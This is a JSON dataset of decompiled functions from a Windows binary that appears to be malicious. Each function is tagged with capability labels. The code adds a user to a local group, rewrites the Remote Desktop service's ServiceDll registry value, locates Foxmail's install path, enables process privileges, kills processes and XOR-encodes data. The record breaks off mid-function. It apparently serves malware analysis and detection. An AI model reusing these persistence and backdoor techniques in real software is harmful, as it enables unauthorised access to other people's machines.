    "000888bb": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint fcn.000888bb(void)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\\\\Aerofox\\\\FoxmailPreview\", 0, 0x20019, &hKey);\n    if (iVar1 == 0) {\n        var_4h = 0x104;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, \"Executable\", 0, 0, 0x967b8, &var_4h);\n        if (iVar1 == 0) {\n            (*_sym.imp.SHLWAPI.dll_PathRemoveFileSpecA)(0x967b8);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 192
    },
    "0008bafb": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.0008bafb(void)\n\n{\n    int32_t iVar1;\n    uint arg_10h;\n    uint arg_8h;\n    uint uVar2;\n    char16_t *arg_ch;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint lpSubKey;\n    uint var_ch;\n    uint phkResult;\n    \n    uVar2 = 0;\n    phkResult = 0;\n    fcn.000833ab(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_18h = 0;\n    var_14h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x102, &phkResult);\n    if (iVar1 == 0) {\n        arg_10h = fcn.00082fe7(&var_20h);\n        arg_ch = L\"ServiceDll\";\n        arg_8h = fcn.000833ab(L\"ServiceDll\");\n        iVar1 = fcn.0008eb18(arg_8h, arg_ch, arg_10h);\n        fcn.000858fb();\n        var_ch = 0;\n        fcn.00082dff();\n        fcn.0008ea99();\n        if (iVar1 != 0) {\n            uVar2 = 1;\n        }\n    }\n    fcn.00082dff();\n    fcn.000858fb();\n    fcn.0008ea99();\n    return uVar2;\n}\n",
        "token_count": 349
    },
    "0008bdf7": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nvoid fcn.0008bdf7(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char16_t *pcVar4;\n    uint *puVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpSubKey;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    fcn.000833ab(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\");\n    fcn.000833ab(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_20h = 0;\n    var_1ch = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar2 != 0) goto code_r0x0008bf40;\n    puVar5 = &var_20h;\n    pcVar4 = L\"ImagePath\";\n    uVar3 = fcn.000833ab(L\"ImagePath\");\n    iVar2 = fcn.0008eaae(uVar3, pcVar4);\n    fcn.000858fb(uVar3, pcVar4, puVar5);\n    fcn.0008ea99();\n    if (iVar2 == 0) goto code_r0x0008bf40;\n    fcn.00082ca1(&var_8h);\n    fcn.00082d8c();\n    pcVar1 = _sym.imp.SHLWAPI.dll_StrStrW;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_StrStrW)(var_8h, L\"svchost.exe\");\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(var_8h, L\"svchost.exe -k\");\n        if (iVar2 != 0) goto code_r0x0008beb4;\n    }\n    else {\ncode_r0x0008beb4:\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, var_10h, 0, 0x20119, &phkResult);\n        if (iVar2 == 0) {\n            pcVar4 = L\"ServiceDll\";\n            uVar3 = fcn.000833ab(L\"ServiceDll\");\n            iVar2 = fcn.0008eaae(uVar3, pcVar4);\n            fcn.000858fb();\n            if (iVar2 != 0) {\n                fcn.00082ca1(&var_18h);\n                uVar3 = fcn.00082f9a();\n                fcn.000831fd(uVar3);\n                fcn.000858fb();\n                var_ch = 0;\n                fcn.000858fb();\n            }\n            fcn.0008ea99();\n        }\n    }\n    fcn.000858fb();\n    var_8h = 0;\ncode_r0x0008bf40:\n    fcn.00082dff();\n    fcn.000858fb();\n    fcn.000858fb();\n    fcn.0008ea99();\n    return;\n}\n",
        "token_count": 728
    },
    "0008bf64": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint fcn.0008bf64(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint uVar4;\n    char16_t *arg_ch;\n    uint var_14h;\n    uint var_10h;\n    uint lpSubKey;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    fcn.000833ab(L\"SYSTEM\\\\CurrentControlSet\\\\Services\\\\TermService\\\\Parameters\");\n    var_14h = 0;\n    var_10h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar1 == 0) {\n        puVar3 = &var_14h;\n        arg_ch = L\"ServiceDll\";\n        uVar2 = fcn.000833ab(L\"ServiceDll\");\n        iVar1 = fcn.0008eaae(uVar2, arg_ch);\n        fcn.000858fb(uVar2, arg_ch, puVar3);\n        if (iVar1 != 0) {\n            uVar4 = 0x97cfc;\n            puVar3 = &var_8h;\n            fcn.00082ca1(puVar3);\n            uVar2 = fcn.0008300e(puVar3);\n            fcn.000858fb(puVar3, uVar4);\n            var_8h = 0;\n            goto code_r0x0008bfd2;\n        }\n        fcn.0008ea99();\n    }\n    uVar2 = 0;\ncode_r0x0008bfd2:\n    fcn.00082dff();\n    fcn.000858fb();\n    fcn.0008ea99();\n    return uVar2;\n}\n",
        "token_count": 415
    },
    "0008eb4b": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008eb4b(uint hKey, uint *arg_ch, uint samDesired, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_14h != 0) && (iVar1 = fcn.0008d4e2(),  iVar1 == 0)) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(hKey, *arg_ch, 0, 0, 0, samDesired, 0);\n        if (iVar1 != 0) {\n            return 0;\n        }\n        fcn.0008ea99();\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, *arg_ch, 0, samDesired);\n    if (iVar1 != 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 203
    },
    "0008f1ec": {
        "rules": [
            "create or open registry key",
            "set registry value"
        ],
        "decompiled_code": "\nvoid fcn.0008f1ec(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint phkResult;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001, 0x944fc, 0, 0xf003f, &phkResult);\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001, 0x944fc, 0, 0, 0, 0xf003f, 0, &phkResult, &var_8h);\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(0x968c0);\n    (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(phkResult, 0x9451c, 0, 1, 0x968c0, iVar1 << 2);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n    return;\n}\n",
        "token_count": 237
    },
    "0008b55d": {
        "rules": [
            "add user account"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008b55d(uint *arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = arg_8h;\n    puVar3 = &var_20h;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_20h = *arg_8h;\n    var_14h = 1;\n    var_10h = 0;\n    var_1ch = *arg_ch;\n    var_ch = 0;\n    var_8h = 0x10201;\n    var_4h = 0;\n    iVar2 = (*_sym.imp.NETAPI32.dll_NetUserAdd)(0, 1, &var_20h, 0);\n    if (iVar2 == 0) {\n        arg_8h = *puVar1;\n        puVar1 = fcn.0008d2c9();\n        iVar2 = (*_sym.imp.NETAPI32.dll_NetLocalGroupAddMembers)(0, *puVar1, 3, &arg_8h, 1);\n        fcn.000858fb();\n        if (iVar2 == 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 369
    },
    "0008e476": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nuint fcn.0008e476(void)\n\n{\n    int32_t in_FS_OFFSET;\n    \n    if (*(in_FS_OFFSET + 0x30) != 0) {\n        return *(***(*(*(in_FS_OFFSET + 0x30) + 0xc) + 0xc) + 0x18);\n    }\n    return 0;\n}\n",
        "token_count": 77
    },
    "0008e7e1": {
        "rules": [
            "open process",
            "terminate process"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008e7e1(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(1, 0, param_1);\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_TerminateProcess)(iVar1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 120
    },
    "000911c5": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nint32_t fcn.000911c5(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = fcn.0008f3f9();\n    iVar1 = fcn.000810d5(iVar3);\n    iVar2 = fcn.000810d5(\"test\");\n    iVar4 = 0;\n    if (0 < iVar1) {\n        do {\n            *(iVar4 + iVar3) = *(iVar4 + iVar3) ^ \"test\"[iVar4 % iVar2];\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < iVar1);\n    }\n    return iVar3;\n}\n",
        "token_count": 159
    },
    "000810d5": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.000810d5(char *param_1)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    return pcVar2 + (-1 - param_1);\n}\n",
        "token_count": 90
    },
    "00081114": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00081114(char *param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    pcVar2 = param_1;\n    do {\n        cVar1 = *param_2;\n        *pcVar2 = cVar1;\n        pcVar2 = pcVar2 + 1;\n        param_2 = param_2 + 1;\n    } while (cVar1 != '\\0');\n    return param_1;\n}\n",
        "token_count": 110
    },
    "000823b2": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000823b2(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint32_t uVar4;\n    \n    uVar4 = in_ECX[2];\n    if (uVar4 < in_ECX[1]) {\n        iVar3 = *in_ECX;\n    }\n    else {\n        iVar1 = uVar4 + 1;\n        iVar2 = in_ECX[3];\n        iVar3 = fcn.000859a9();\n        uVar4 = 0;\n        if (in_ECX[2] != 0) {\n            do {\n                *(iVar3 + uVar4 * 4) = *(*in_ECX + uVar4 * 4);\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < in_ECX[2]);\n        }\n        uVar4 = in_ECX[2];\n        in_ECX[1] = iVar1 * iVar2;\n        *in_ECX = iVar3;\n    }\n    *(iVar3 + uVar4 * 4) = arg_8h;\n    in_ECX[2] = in_ECX[2] + 1;\n    return;\n}\n",
        "token_count": 283
    },
    "000857db": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.000857db(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code **ppcVar3;\n    \n    if (*0x97d3c != 0) {\n        uVar1 = 0;\n        uVar2 = *0x97814 + *0x97d3c + (3 - *0x97814) >> 2;\n        if (*0x97814 + *0x97d3c < *0x97814) {\n            uVar2 = 0;\n        }\n        ppcVar3 = *0x97814;\n        if (uVar2 != 0) {\n            do {\n                if (*ppcVar3 != NULL) {\n                    (**ppcVar3)();\n                }\n                ppcVar3 = ppcVar3 + 1;\n                uVar1 = uVar1 + 1;\n            } while (uVar1 < uVar2);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 218
    },
    "00085985": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00085985(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uchar *in_EDX;\n    int32_t iVar1;\n    \n    if (arg_8h != 0) {\n        iVar1 = in_ECX - in_EDX;\n        do {\n            in_EDX[iVar1] = *in_EDX;\n            in_EDX = in_EDX + 1;\n            arg_8h = arg_8h + -1;\n        } while (arg_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0008df77": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0008df77(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    fcn.0008d9f6();\n    *(param_1 + 0x18) = 0;\n    *(param_1 + 0x1c) = 0;\n    iVar3 = 5;\n    *(param_1 + 0x38) = 5;\n    *(param_1 + 0x30) = 5;\n    *(param_1 + 0x34) = 0;\n    puVar1 = fcn.000859a9();\n    if (puVar1 == NULL) {\n        puVar2 = NULL;\n    }\n    else {\n        puVar2 = puVar1 + 1;\n        *puVar1 = 5;\n        puVar1 = puVar1 + 0xb;\n        do {\n            *puVar1 = 0;\n            puVar1[1] = 0;\n            iVar3 = iVar3 + -1;\n            puVar1 = puVar1 + 0xc;\n        } while (iVar3 != 0);\n    }\n    *(param_1 + 0x2c) = puVar2;\n    *(param_1 + 0x3c) = 0;\n    return param_1;\n}\n",
        "token_count": 304
    },
    "0008fb5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.0008fb5c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *var_ch;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    iVar2 = 0;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    ppv = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x923c0, 0, 1, 0x92370, &ppv);\n    if (ppv != NULL) {\n        (**(*ppv + 0xc))(ppv, 0x923b0, &var_4h, 0);\n        if (var_4h != NULL) {\n            (**(*var_4h + 0x14))(var_4h);\n            while( true ) {\n                iVar1 = (**(*var_4h + 0xc))(var_4h, 1, &var_ch, 0);\n                if (iVar1 != 0) break;\n                iVar2 = iVar2 + 1;\n                if (var_ch != NULL) {\n                    (**(*var_ch + 8))(var_ch);\n                    var_ch = NULL;\n                }\n            }\n            if (var_4h != NULL) {\n                (**(*var_4h + 8))(var_4h);\n                var_4h = NULL;\n            }\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n            ppv = NULL;\n        }\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return iVar2;\n}\n",
        "token_count": 357
    },
    "0008fdd4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0008fdd4(uint noname_0, int32_t **arg_ch)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    int32_t in_EDX;\n    int32_t iVar4;\n    uint *puVar5;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    ppiVar1 = arg_ch;\n    iVar2 = *in_ECX;\n    iVar4 = 0;\n    *arg_ch = NULL;\n    puVar5 = &var_8h;\n    var_ch = in_EDX;\n    iVar2 = (**(iVar2 + 0x28))();\n    if (-1 < iVar2) {\n        iVar2 = -0x7fffbffb;\n        while (iVar3 = (**(*var_8h + 0xc))(var_8h, 1, &arg_ch, &var_10h),  iVar3 == 0) {\n            var_4h = 3;\n            (*(*arg_ch)[9])(arg_ch, &var_4h);\n            if (var_4h == var_ch) {\n                if (iVar4 == 0) {\n                    *ppiVar1 = arg_ch;\n                    return 0;\n                }\n                iVar4 = iVar4 + -1;\n            }\n            (*(*arg_ch)[2])(arg_ch, puVar5);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 347
    },
    "00090024": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00090024(void)\n\n{\n    int16_t *piVar1;\n    uchar uVar2;\n    int16_t iVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint pvarg;\n    int16_t *var_20h;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t *var_ch;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    var_ch = NULL;\n    ppv = NULL;\n    var_4h = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x923c0, 0, 1, 0x94674, &ppv);\n    if ((ppv != NULL) && ((**(*ppv + 0xc))(ppv, 0x923b0, &var_4h, 0),  var_4h != NULL)) {\n        (**(*var_4h + 0x14))(var_4h);\n        iVar6 = 0;\n        while( true ) {\n            iVar7 = 0;\n            var_10h = 0;\n            iVar5 = (**(*var_4h + 0xc))(var_4h, 1, &var_14h, &var_10h);\n            if ((iVar5 != 0) ||\n               (piVar4 = var_14h + iVar6 * 4,  iVar5 = (**(*piVar4 + 0x24))(piVar4, 0, 0, 0x92340, &var_ch),  iVar5 != 0\n               )) break;\n            (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvarg);\n            iVar5 = (**(*var_ch + 0xc))(var_ch, 0x9460c, &pvarg, 0);\n            if ((iVar5 != 0) && (iVar5 = (**(*var_ch + 0xc))(var_ch, L\"FriendlyName\", &pvarg, 0),  iVar5 != 0)) break;\n            iVar5 = fcn.000859a9();\n            if (iVar5 == 0) {\n                piVar4 = NULL;\n            }\n            else {\n                piVar4 = fcn.000902dc();\n            }\n            iVar3 = *var_20h;\n            piVar1 = var_20h;\n            while (iVar3 != 0) {\n                *(piVar4[1] + iVar7 * 2) = iVar3;\n                uVar2 = *piVar1;\n                piVar1 = piVar1 + 1;\n                *(iVar7 + *piVar4) = uVar2;\n                iVar7 = iVar7 + 1;\n                iVar3 = *piVar1;\n            }\n            piVar4[2] = iVar6;\n            fcn.000823b2(piVar4);\n            iVar6 = iVar6 + 1;\n        }\n        if (var_4h != NULL) {\n            (**(*var_4h + 8))(var_4h);\n            var_4h = NULL;\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n            ppv = NULL;\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return;\n}\n",
        "token_count": 764
    },
    "00090308": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00090308(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    \n    fcn.000903a6(param_1);\n    uVar1 = 0;\n    if (param_1[3] != 0) {\n        do {\n            fcn.000856f9();\n            if (*(param_1[1] + uVar1 * 4) != 0) {\n                fcn.00090678();\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_1[3]);\n    }\n    if (*param_1 != 0) {\n        fcn.0008fd71();\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 193
    },
    "00090354": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00090354(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    arg_8h[3] = 5;\n    arg_8h[1] = 5;\n    arg_8h[2] = 0;\n    uVar1 = fcn.000859a9();\n    *arg_8h = uVar1;\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            fcn.000856f9();\n            fcn.000823b2(*(*(in_ECX + 4) + uVar2 * 4));\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *(in_ECX + 0xc));\n    }\n    return arg_8h;\n}\n",
        "token_count": 202
    },
    "00082747": {
        "rules": [
            "check if file exists"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00082747(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint *lpBuffer;\n    uint uVar2;\n    int32_t arg_8h;\n    uint arg_ch;\n    uint var_20h;\n    uint var_8h;\n    uint pszPath;\n    \n    iVar1 = param_2 + 8;\n    arg_8h = iVar1;\n    fcn.000833f3(iVar1);\n    fcn.0008dd2b(arg_8h, arg_ch);\n    fcn.000833f3(iVar1);\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath);\n    fcn.000858fb();\n    if (iVar1 == 0) {\n        iVar1 = fcn.0008dcf9(extraout_ECX, extraout_ECX);\n    }\n    else {\n        iVar1 = fcn.0008dcba(0x40000000);\n    }\n    if (iVar1 != 0) {\n        fcn.00082e12(param_2 + 0x14);\n        lpBuffer = &var_8h;\n        uVar2 = extraout_ECX_00;\n        fcn.0008dc65(lpBuffer);\n        fcn.00082dff(lpBuffer, uVar2);\n        fcn.0008dc4d();\n    }\n    fcn.0008da15();\n    return;\n}\n",
        "token_count": 338
    },
    "000856f9": {
        "rules": [
            "terminate process",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.000856f9(char param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, 0x9263c);\n    if (param_1 == '\\0') {\n        if (pcVar2 != NULL) {\n            (*pcVar2)(0, \"An assertion condition failed\", \"Assert\", 0x2010);\n        }\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(1);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "0008d4d0": {
        "rules": [
            "create directory"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0008d4d0(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHELL32.dll_SHCreateDirectoryExW)(0, *param_1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 65
    },
    "0008e721": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008e721(uint *param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32\", 0x94320);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(*param_1, &var_4h);\n    }\n    return var_4h;\n}\n",
        "token_count": 131
    },
    "0008dc65": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008dc65(uint *lpBuffer)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint lpNumberOfBytesWritten;\n    \n    if (*in_ECX != 0) {\n        fcn.0008dd97();\n    }\n    lpNumberOfBytesWritten = 0;\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(in_ECX[2], 0, 0, 2);\n    uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(in_ECX[2], *lpBuffer, lpBuffer[1], &lpNumberOfBytesWritten, 0);\n    if (*in_ECX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[3]);\n    }\n    return uVar1;\n}\n",
        "token_count": 177
    },
    "0008eaae": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008eaae(uint *lpValueName, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    uint *in_ECX;\n    uint lpType;\n    uint lpcbData;\n    \n    lpcbData = 0;\n    lpType = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(*in_ECX, *lpValueName, 0, &lpType, 0, &lpcbData);\n    if (iVar1 == 0) {\n        arg_8h = fcn.000859a9();\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(*in_ECX, *lpValueName, 0, &lpType, arg_8h, &lpcbData);\n        if (iVar1 == 0) {\n            fcn.00082d5a(arg_8h, lpcbData);\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 226
    },
    "0008b5e1": {
        "rules": [
            "get service handle",
            "modify service"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0008b5e1(uint *lpServiceName, uint dwStartType)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    uVar4 = uVar2;\n    if (uVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(uVar2, *lpServiceName, 2);\n        if (iVar3 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n            uVar4 = 0;\n        }\n        else {\n            iVar5 = (*_sym.imp.ADVAPI32.dll_ChangeServiceConfigW)\n                              (iVar3, 0xffffffff, dwStartType, 0xffffffff, 0, 0, 0, 0, 0, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            uVar4 = iVar5 != 0;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n            (*pcVar1)(iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 307
    },
    "0008b6d2": {
        "rules": [
            "get service handle"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0008b6d2(uint *lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint pcbBytesNeeded;\n    \n    pcbBytesNeeded = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar2, *lpServiceName, 1);\n        if (iVar3 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        }\n        else {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_QueryServiceConfigW)(iVar3, 0, 0, &pcbBytesNeeded);\n            if ((iVar4 != 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 == 0x7a)) {\n                iVar4 = fcn.00085955();\n                iVar5 = (*_sym.imp.ADVAPI32.dll_QueryServiceConfigW)(iVar3, iVar4, pcbBytesNeeded, &pcbBytesNeeded);\n                pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                if (iVar5 != 0) {\n                    iVar5 = *(iVar4 + 4);\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                    (*pcVar1)(iVar3);\n                    fcn.000810c1(iVar4);\n                    return iVar5;\n                }\n            }\n            pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n            (*pcVar1)(iVar3);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 428
    },
    "0008eb18": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0008eb18(uint *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX != 0) &&\n       (iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(*in_ECX, *arg_8h, 0, arg_10h, *arg_ch, arg_ch[1]),  iVar1 == 0))\n    {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 126
    },
    "0008d3ca": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0008d3ca(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint PreviousState;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint NewState;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpLuid;\n    uint var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    PreviousState = 0;\n    TokenHandle = 0;\n    _lpLuid = 0;\n    ReturnLength = 0;\n    uStack48 = 0;\n    uStack44 = 0;\n    uStack40 = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 0x28, &TokenHandle);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueW)(0, *param_2, &lpLuid),  iVar1 != 0)) {\n        var_1ch = lpLuid;\n        var_18h = var_ch;\n        NewState = 1;\n        var_14h = 2;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)\n                          (TokenHandle, 0, &NewState, 0x10, &PreviousState, &ReturnLength);\n        if (iVar1 != 0) {\n            return 1;\n        